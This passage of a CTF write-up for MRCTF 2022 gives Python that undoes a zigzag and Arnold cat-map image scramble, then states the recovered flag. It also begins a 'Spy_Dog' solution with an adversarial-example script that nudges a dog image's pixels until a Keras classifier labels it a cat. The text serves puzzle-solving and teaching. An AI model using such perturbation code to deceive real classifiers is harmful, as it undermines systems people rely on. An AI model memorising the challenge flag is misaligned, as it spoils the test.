+<a id="__codelineno-3-64" name="__codelineno-3-64" href="__codelineno-3-64"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-65" name="__codelineno-3-65" href="__codelineno-3-65"></a>            <span class="k">elif</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-66" name="__codelineno-3-66" href="__codelineno-3-66"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-67" name="__codelineno-3-67" href="__codelineno-3-67"></a>            <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-3-68" name="__codelineno-3-68" href="__codelineno-3-68"></a>                <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-3-69" name="__codelineno-3-69" href="__codelineno-3-69"></a>                <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">-</span> <span class="mi">1</span>
+<a id="__codelineno-3-70" name="__codelineno-3-70" href="__codelineno-3-70"></a>    <span class="k">return</span> <span class="n">lst</span>
+<a id="__codelineno-3-71" name="__codelineno-3-71" href="__codelineno-3-71"></a>
+<a id="__codelineno-3-72" name="__codelineno-3-72" href="__codelineno-3-72"></a><span class="k">def</span> <span class="nf">ZigZag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<a id="__codelineno-3-73" name="__codelineno-3-73" href="__codelineno-3-73"></a>    <span class="n">lst</span> <span class="o">=</span> <span class="n">zigzag</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-3-74" name="__codelineno-3-74" href="__codelineno-3-74"></a>    <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-3-75" name="__codelineno-3-75" href="__codelineno-3-75"></a>    <span class="n">ret</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
+<a id="__codelineno-3-76" name="__codelineno-3-76" href="__codelineno-3-76"></a>    <span class="n">row</span><span class="p">,</span> <span class="n">col</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">shape</span>
+<a id="__codelineno-3-77" name="__codelineno-3-77" href="__codelineno-3-77"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">):</span>
+<a id="__codelineno-3-78" name="__codelineno-3-78" href="__codelineno-3-78"></a>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-79" name="__codelineno-3-79" href="__codelineno-3-79"></a>            <span class="n">ret</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">lst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span>
+<a id="__codelineno-3-80" name="__codelineno-3-80" href="__codelineno-3-80"></a>            <span class="n">k</span> <span class="o">+=</span> <span class="mi">1</span>
+<a id="__codelineno-3-81" name="__codelineno-3-81" href="__codelineno-3-81"></a>    <span class="k">return</span> <span class="n">ret</span>
+<a id="__codelineno-3-82" name="__codelineno-3-82" href="__codelineno-3-82"></a>
+<a id="__codelineno-3-83" name="__codelineno-3-83" href="__codelineno-3-83"></a><span class="k">def</span> <span class="nf">deZigZag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<a id="__codelineno-3-84" name="__codelineno-3-84" href="__codelineno-3-84"></a>    <span class="n">lst</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-3-85" name="__codelineno-3-85" href="__codelineno-3-85"></a>    <span class="n">row</span><span class="p">,</span> <span class="n">col</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">shape</span>
+<a id="__codelineno-3-86" name="__codelineno-3-86" href="__codelineno-3-86"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">row</span><span class="p">):</span>
+<a id="__codelineno-3-87" name="__codelineno-3-87" href="__codelineno-3-87"></a>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">col</span><span class="p">):</span>
+<a id="__codelineno-3-88" name="__codelineno-3-88" href="__codelineno-3-88"></a>            <span class="n">lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
+<a id="__codelineno-3-89" name="__codelineno-3-89" href="__codelineno-3-89"></a>    <span class="n">ret</span> <span class="o">=</span> <span class="n">dezigzag</span><span class="p">(</span><span class="n">lst</span><span class="p">)</span>
+<a id="__codelineno-3-90" name="__codelineno-3-90" href="__codelineno-3-90"></a>    <span class="k">return</span> <span class="n">ret</span>
+<a id="__codelineno-3-91" name="__codelineno-3-91" href="__codelineno-3-91"></a>
+<a id="__codelineno-3-92" name="__codelineno-3-92" href="__codelineno-3-92"></a><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;XXX&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">)</span>
+<a id="__codelineno-3-93" name="__codelineno-3-93" href="__codelineno-3-93"></a><span class="n">arr</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">img</span><span class="p">)</span>
+<a id="__codelineno-3-94" name="__codelineno-3-94" href="__codelineno-3-94"></a><span class="c1">#for i in range(64):</span>
+<a id="__codelineno-3-95" name="__codelineno-3-95" href="__codelineno-3-95"></a>    <span class="c1">#for j in range(64):</span>
+<a id="__codelineno-3-96" name="__codelineno-3-96" href="__codelineno-3-96"></a>        <span class="c1"># arr[8*i:8*i+8, 8*j:8*j+8] = ZigZag(arr[8*i:8*i+8, 8*j:8*j+8])</span>
+<a id="__codelineno-3-97" name="__codelineno-3-97" href="__codelineno-3-97"></a>        <span class="c1">#arr[8*i:8*i+8, 8*j:8*j+8] = deZigZag(arr[8*i:8*i+8, 8*j:8*j+8])</span>
+<a id="__codelineno-3-98" name="__codelineno-3-98" href="__codelineno-3-98"></a><span class="n">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">512</span><span class="p">,</span><span class="mi">0</span><span class="p">:</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="n">deZigZag</span><span class="p">(</span><span class="n">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">512</span><span class="p">,</span> <span class="mi">0</span><span class="p">:</span><span class="mi">512</span><span class="p">])</span>
+<a id="__codelineno-3-99" name="__codelineno-3-99" href="__codelineno-3-99"></a><span class="n">img2</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">fromarray</span><span class="p">(</span><span class="n">arr</span><span class="p">,</span> <span class="s2">&quot;L&quot;</span><span class="p">)</span>
+<a id="__codelineno-3-100" name="__codelineno-3-100" href="__codelineno-3-100"></a><span class="n">img2</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+<a id="__codelineno-3-101" name="__codelineno-3-101" href="__codelineno-3-101"></a><span class="n">img2</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&quot;XXX&quot;</span><span class="p">)</span>
+</code></pre></div>
+</details>
+<p><img alt="zigzagY.bmp" src="/assets/images/writeups/mrctf2022/zigzagY.bmp" /></p>
+<p>明显是猫图算法，参数 20 22</p>
+<details class="example">
+<summary>cat map</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="__codelineno-4-1"></a><span class="kn">import</span> <span class="nn">os</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="__codelineno-4-2"></a>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="__codelineno-4-3"></a><span class="kn">from</span> <span class="nn">PIL.Image</span> <span class="kn">import</span> <span class="nb">open</span> <span class="k">as</span> <span class="n">load_pic</span><span class="p">,</span> <span class="n">new</span> <span class="k">as</span> <span class="n">new_pic</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="__codelineno-4-4"></a>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="__codelineno-4-5"></a><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">iterations</span><span class="p">,</span> <span class="n">keep_all</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">XXX</span><span class="p">):</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="__codelineno-4-6"></a>    <span class="n">title</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">path</span><span class="p">)[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="__codelineno-4-7"></a>    <span class="n">ppath</span><span class="o">=</span><span class="n">path</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="__codelineno-4-8"></a>    <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="__codelineno-4-9"></a>    <span class="k">while</span> <span class="n">counter</span> <span class="o">&lt;</span> <span class="n">iterations</span><span class="p">:</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="__codelineno-4-10"></a>        <span class="k">with</span> <span class="n">load_pic</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="k">as</span> <span class="n">image</span><span class="p">:</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="__codelineno-4-11"></a>            <span class="n">dim</span> <span class="o">=</span> <span class="n">width</span><span class="p">,</span> <span class="n">height</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">size</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="__codelineno-4-12"></a>            <span class="k">with</span> <span class="n">new_pic</span><span class="p">(</span><span class="n">image</span><span class="o">.</span><span class="n">mode</span><span class="p">,</span> <span class="n">dim</span><span class="p">)</span> <span class="k">as</span> <span class="n">canvas</span><span class="p">:</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="__codelineno-4-13"></a>                <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">width</span><span class="p">):</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="__codelineno-4-14"></a>                    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">height</span><span class="p">):</span>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="__codelineno-4-15"></a>                        <span class="n">nx</span> <span class="o">=</span> <span class="p">(</span><span class="mi">441</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">*</span> <span class="n">y</span><span class="p">)</span> <span class="o">%</span> <span class="n">width</span>
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="__codelineno-4-16"></a>                        <span class="n">ny</span> <span class="o">=</span> <span class="p">(</span><span class="mi">22</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">*</span> <span class="n">y</span><span class="p">)</span> <span class="o">%</span> <span class="n">height</span>
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="__codelineno-4-17"></a>                        <span class="n">canvas</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">nx</span><span class="p">,</span> <span class="n">height</span><span class="o">-</span><span class="n">ny</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="n">image</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">height</span><span class="o">-</span><span class="n">y</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span>
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="__codelineno-4-18"></a>        <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">keep_all</span><span class="p">:</span>
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="__codelineno-4-19"></a>            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="__codelineno-4-20"></a>        <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="__codelineno-4-21"></a>        <span class="nb">print</span><span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\r</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="__codelineno-4-22"></a>        <span class="n">path</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="n">title</span><span class="p">,</span> <span class="n">index</span><span class="o">=</span><span class="n">counter</span><span class="p">)</span>
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="__codelineno-4-23"></a>        <span class="n">canvas</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+<a id="__codelineno-4-24" name="__codelineno-4-24" href="__codelineno-4-24"></a>
+<a id="__codelineno-4-25" name="__codelineno-4-25" href="__codelineno-4-25"></a>    <span class="k">return</span> <span class="n">canvas</span>
+<a id="__codelineno-4-26" name="__codelineno-4-26" href="__codelineno-4-26"></a>
+<a id="__codelineno-4-27" name="__codelineno-4-27" href="__codelineno-4-27"></a><span class="n">result</span> <span class="o">=</span> <span class="n">main</span><span class="p">(</span><span class="n">XXX</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+<a id="__codelineno-4-28" name="__codelineno-4-28" href="__codelineno-4-28"></a><span class="n">result</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+</code></pre></div>
+</details>
+<p><img alt="arnold_cat-zigzagY-1.png" src="/assets/images/writeups/mrctf2022/arnold_cat-zigzagY-1.png" /></p>
+<p>flag: <strong>MRCTF{f8e49887132bf8977a161472781b718c}</strong></p>
+<hr />
+<h2 id="spy_dog">Spy_Dog<a class="headerlink" href="#spy_dog" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="https://img.shields.io/badge/-MISC-informational?style=flat-square" />
+<img alt="" src="https://img.shields.io/badge/-AI-orange?style=flat-square" /></p>
+<p>要求99.9%的概率识别成猫。</p>
+<p>用梯度反向传播训练网络参数的方式训练图片即可，代码直接抄网上的：<a href="https://www.likecs.com/show-915984.html">https://www.likecs.com/show-915984.html</a></p>
+<p>由于取整带来的问题，训练得到的准确率要比要求高一点</p>
+<details class="done">
+<summary>exp</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="__codelineno-5-1"></a><span class="c1"># %%</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="__codelineno-5-2"></a><span class="kn">from</span> <span class="nn">keras.models</span> <span class="kn">import</span> <span class="n">load_model</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="__codelineno-5-3"></a><span class="kn">import</span> <span class="nn">cv2</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="__codelineno-5-4"></a><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="__codelineno-5-5"></a><span class="kn">from</span> <span class="nn">keras.preprocessing</span> <span class="kn">import</span> <span class="n">image</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="__codelineno-5-6"></a><span class="kn">from</span> <span class="nn">keras.applications</span> <span class="kn">import</span> <span class="n">inception_v3</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="__codelineno-5-7"></a><span class="kn">from</span> <span class="nn">keras</span> <span class="kn">import</span> <span class="n">backend</span> <span class="k">as</span> <span class="n">K</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="__codelineno-5-8"></a><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="__codelineno-5-9"></a><span class="kn">import</span> <span class="nn">tensorflow</span> <span class="k">as</span> <span class="nn">tf</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="__codelineno-5-10"></a><span class="n">tf</span><span class="o">.</span><span class="n">compat</span><span class="o">.</span><span class="n">v1</span><span class="o">.</span><span class="n">disable_eager_execution</span><span class="p">()</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="__codelineno-5-11"></a>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="__codelineno-5-12"></a><span class="c1"># %%</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="__codelineno-5-13"></a><span class="n">model</span> <span class="o">=</span> <span class="n">load_model</span><span class="p">(</span><span class="s2">&quot;simplenn.model&quot;</span><span class="p">)</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="__codelineno-5-14"></a>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="__codelineno-5-15"></a><span class="c1"># %%</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="__codelineno-5-16"></a><span class="c1"># Grab a reference to the first and last layer of the neural net</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="__codelineno-5-17"></a><span class="n">model_input_layer</span> <span class="o">=</span> <span class="n">model</span><span class="o">.</span><span class="n">layers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">input</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="__codelineno-5-18"></a><span class="n">model_output_layer</span> <span class="o">=</span> <span class="n">model</span><span class="o">.</span><span class="n">layers</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">output</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="__codelineno-5-19"></a>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="__codelineno-5-20"></a><span class="n">object_type_to_fake</span> <span class="o">=</span> <span class="mi">1</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="__codelineno-5-21"></a>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="__codelineno-5-22"></a><span class="c1"># Load the image to hack</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="__codelineno-5-23"></a><span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s2">&quot;dog.bmp&quot;</span><span class="p">)</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="__codelineno-5-24"></a><span class="n">original_image</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">float32</span><span class="p">)</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="__codelineno-5-25"></a>
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="__codelineno-5-26"></a><span class="c1"># Scale the image so all pixel intensities are between [-1, 1] as the model expects</span>
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="__codelineno-5-27"></a><span class="n">original_image</span> <span class="o">/=</span> <span class="mf">255.</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="__codelineno-5-28"></a>
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="__codelineno-5-29"></a><span class="c1"># Add a 4th dimension for batch size (as Keras expects)</span>
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="__codelineno-5-30"></a><span class="n">original_image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">expand_dims</span><span class="p">(</span><span class="n">original_image</span><span class="p">,</span> <span class="n">axis</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="__codelineno-5-31"></a>
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="__codelineno-5-32"></a><span class="c1"># Pre-calculate the maximum change we will allow to the image</span>
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="__codelineno-5-33"></a><span class="c1"># We\&#39;ll make sure our hacked image never goes past this so it doesn\&#39;t look funny.</span>
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="__codelineno-5-34"></a><span class="c1"># A larger number produces an image faster but risks more distortion.</span>
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="__codelineno-5-35"></a><span class="n">max_change_above</span> <span class="o">=</span> <span class="n">original_image</span> <span class="o">+</span> <span class="p">(</span><span class="mf">9.4</span><span class="o">/</span><span class="mf">255.</span><span class="p">)</span>
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="__codelineno-5-36"></a><span class="n">max_change_below</span> <span class="o">=</span> <span class="n">original_image</span> <span class="o">-</span> <span class="p">(</span><span class="mf">9.4</span><span class="o">/</span><span class="mf">255.</span><span class="p">)</span>
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="__codelineno-5-37"></a>
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="__codelineno-5-38"></a><span class="c1"># Create a copy of the input image to hack on</span>
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="__codelineno-5-39"></a><span class="n">hacked_image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="n">original_image</span><span class="p">)</span>
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="__codelineno-5-40"></a>
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="__codelineno-5-41"></a><span class="c1"># How much to update the hacked image in each iteration</span>
+<a id="__codelineno-5-42" name="__codelineno-5-42" href="__codelineno-5-42"></a><span class="n">learning_rate</span> <span class="o">=</span> <span class="mf">0.1</span>
+<a id="__codelineno-5-43" name="__codelineno-5-43" href="__codelineno-5-43"></a>
+<a id="__codelineno-5-44" name="__codelineno-5-44" href="__codelineno-5-44"></a><span class="c1"># Define the cost function.</span>
+<a id="__codelineno-5-45" name="__codelineno-5-45" href="__codelineno-5-45"></a><span class="c1"># Our \&#39;cost\&#39; will be the likelihood out image is the target class according to the pre-trained model</span>
+<a id="__codelineno-5-46" name="__codelineno-5-46" href="__codelineno-5-46"></a><span class="n">cost_function</span> <span class="o">=</span> <span class="n">model_output_layer</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="n">object_type_to_fake</span><span class="p">]</span>
+<a id="__codelineno-5-47" name="__codelineno-5-47" href="__codelineno-5-47"></a>
+<a id="__codelineno-5-48" name="__codelineno-5-48" href="__codelineno-5-48"></a><span class="c1"># We\&#39;ll ask Keras to calculate the gradient based on the input image and the currently predicted class</span>
+<a id="__codelineno-5-49" name="__codelineno-5-49" href="__codelineno-5-49"></a><span class="c1"># In this case, referring to &quot;model_input_layer&quot; will give us back image we are hacking.</span>
+<a id="__codelineno-5-50" name="__codelineno-5-50" href="__codelineno-5-50"></a><span class="n">gradient_function</span> <span class="o">=</span> <span class="n">K</span><span class="o">.</span><span class="n">gradients</span><span class="p">(</span><span class="n">cost_function</span><span class="p">,</span> <span class="n">model_input_layer</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<a id="__codelineno-5-51" name="__codelineno-5-51" href="__codelineno-5-51"></a>
+<a id="__codelineno-5-52" name="__codelineno-5-52" href="__codelineno-5-52"></a><span class="c1"># Create a Keras function that we can call to calculate the current cost and gradient</span>
+<a id="__codelineno-5-53" name="__codelineno-5-53" href="__codelineno-5-53"></a><span class="n">grab_cost_and_gradients_from_model</span> <span class="o">=</span> <span class="n">K</span><span class="o">.</span><span class="n">function</span><span class="p">([</span><span class="n">model_input_layer</span><span class="p">,</span> <span class="n">K</span><span class="o">.</span><span class="n">learning_phase</span><span class="p">()],</span> <span class="p">[</span><span class="n">cost_function</span><span class="p">,</span> <span class="n">gradient_function</span><span class="p">])</span>
+<a id="__codelineno-5-54" name="__codelineno-5-54" href="__codelineno-5-54"></a>
+<a id="__codelineno-5-55" name="__codelineno-5-55" href="__codelineno-5-55"></a><span class="n">cost</span> <span class="o">=</span> <span class="mf">0.0</span>
+<a id="__codelineno-5-56" name="__codelineno-5-56" href="__codelineno-5-56"></a>
+<a id="__codelineno-5-57" name="__codelineno-5-57" href="__codelineno-5-57"></a><span class="c1"># In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more</span>
+<a id="__codelineno-5-58" name="__codelineno-5-58" href="__codelineno-5-58"></a><span class="c1"># until it gets to at least 80% confidence</span>
+<a id="__codelineno-5-59" name="__codelineno-5-59" href="__codelineno-5-59"></a><span class="k">while</span> <span class="n">cost</span> <span class="o">&lt;</span> <span class="mf">0.9995</span><span class="p">:</span>
+<a id="__codelineno-5-60" name="__codelineno-5-60" href="__codelineno-5-60"></a>    <span class="c1"># Check how close the image is to our target class and grab the gradients we</span>
+<a id="__codelineno-5-61" name="__codelineno-5-61" href="__codelineno-5-61"></a>    <span class="c1"># can use to push it one more step in that direction.</span>
+<a id="__codelineno-5-62" name="__codelineno-5-62" href="__codelineno-5-62"></a>    <span class="c1"># Note: It\&#39;s really important to pass in \&#39;0\&#39; for the Keras learning mode here!</span>
+<a id="__codelineno-5-63" name="__codelineno-5-63" href="__codelineno-5-63"></a>    <span class="c1"># Keras layers behave differently in prediction vs. train modes!</span>
+<a id="__codelineno-5-64" name="__codelineno-5-64" href="__codelineno-5-64"></a>    <span class="n">cost</span><span class="p">,</span> <span class="n">gradients</span> <span class="o">=</span> <span class="n">grab_cost_and_gradients_from_model</span><span class="p">([</span><span class="n">hacked_image</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>
+<a id="__codelineno-5-65" name="__codelineno-5-65" href="__codelineno-5-65"></a>
+<a id="__codelineno-5-66" name="__codelineno-5-66" href="__codelineno-5-66"></a>    <span class="c1"># Move the hacked image one step further towards fooling the model</span>
+<a id="__codelineno-5-67" name="__codelineno-5-67" href="__codelineno-5-67"></a>    <span class="n">hacked_image</span> <span class="o">+=</span> <span class="n">gradients</span> <span class="o">*</span> <span class="n">learning_rate</span>
+<a id="__codelineno-5-68" name="__codelineno-5-68" href="__codelineno-5-68"></a>
+<a id="__codelineno-5-69" name="__codelineno-5-69" href="__codelineno-5-69"></a>    <span class="c1"># Ensure that the image doesn\&#39;t ever change too much to either look funny or to become an invalid image</span>
+<a id="__codelineno-5-70" name="__codelineno-5-70" href="__codelineno-5-70"></a>    <span class="n">hacked_image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">clip</span><span class="p">(</span><span class="n">hacked_image</span><span class="p">,</span> <span class="n">max_change_below</span><span class="p">,</span> <span class="n">max_change_above</span><span class="p">)</span>
+<a id="__codelineno-5-71" name="__codelineno-5-71" href="__codelineno-5-71"></a>    <span class="n">hacked_image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">clip</span><span class="p">(</span><span class="n">hacked_image</span><span class="p">,</span> <span class="o">-</span><span class="mf">1.0</span><span class="p">,</span> <span class="mf">1.0</span><span class="p">)</span>
+<a id="__codelineno-5-72" name="__codelineno-5-72" href="__codelineno-5-72"></a>
+<a id="__codelineno-5-73" name="__codelineno-5-73" href="__codelineno-5-73"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Model</span><span class="se">\&#39;</span><span class="s2">s predicted likelihood that the image is a cat: </span><span class="si">{:.8}</span><span class="s2">%&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cost</span> <span class="o">*</span> <span class="mi">100</span><span class="p">))</span>
+<a id="__codelineno-5-74" name="__codelineno-5-74" href="__codelineno-5-74"></a>
+<a id="__codelineno-5-75" name="__codelineno-5-75" href="__codelineno-5-75"></a><span class="c1"># De-scale the image\&#39;s pixels from [-1, 1] back to the [0, 255] range</span>
+<a id="__codelineno-5-76" name="__codelineno-5-76" href="__codelineno-5-76"></a><span class="n">img</span> <span class="o">=</span> <span class="n">hacked_image</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
+<a id="__codelineno-5-77" name="__codelineno-5-77" href="__codelineno-5-77"></a><span class="n">img</span> <span class="o">*=</span> <span class="mf">255.</span>
+<a id="__codelineno-5-78" name="__codelineno-5-78" href="__codelineno-5-78"></a>
+<a id="__codelineno-5-79" name="__codelineno-5-79" href="__codelineno-5-79"></a><span class="c1"># Save the hacked image!</span>
